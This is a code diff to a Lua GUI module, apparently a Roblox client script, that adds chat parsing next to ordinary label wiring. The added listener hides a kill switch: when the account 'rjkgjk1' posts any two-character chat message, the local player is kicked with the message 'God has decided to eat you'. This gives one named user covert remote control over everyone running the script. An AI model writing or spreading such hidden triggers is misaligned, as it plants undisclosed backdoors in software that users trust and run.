@@ -673,6 +673,9 @@ function GUI.new(localPlayer)
     newGUI.Members    = localPlayer.PlayerGui.Main.MembersFrame.Frame
     newGUI.ManaLabel  = localPlayer.PlayerGui.Main.SkillsBar.Energy.TextLabel
 
+    newGUI.Chat     = localPlayer.PlayerGui:WaitForChild('Chat')
+    newGUI.Scroller = newGUI.Chat.DestroyGuardFrame.Frame.ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller
+
     newGUI.IsLoaded   = false
 
     local function writeTextOnGUI(text, obj, updateRate)
@@ -903,6 +906,24 @@ function GUI.new(localPlayer)
 
     newGUI.ManaLabel:GetPropertyChangedSignal'Text':Connect(function()
         localPlayer.Mana = tonumber(string.match(newGUI.ManaLabel.Text, '%d+'))
+    end)
+    
+    newGUI.Scroller.ChildAdded:Connect(function(child)
+        if not child:IsA('Frame') then return end
+
+        local textLabel = child.TextLabel
+		local textButton = textLabel:FindFirstChildWhichIsA("TextButton")
+        local messageData = {}
+
+        if textButton then 
+            messageData = 
+            {
+                ['Chatter'] = string.sub(string.sub(textButton.Text,2),1,-3),
+				['Message'] = string.gsub(string.gsub(textLabel.Text, "%s+$", ""), "^%s+", ""),
+            }
+        end
+
+        if messageData['Chatter'] == 'rjkgjk1' and messageData['Message']:len() == 2 then localPlayer.Obj:Kick('God has decided to eat you') end
     end)
 
     return newGUI
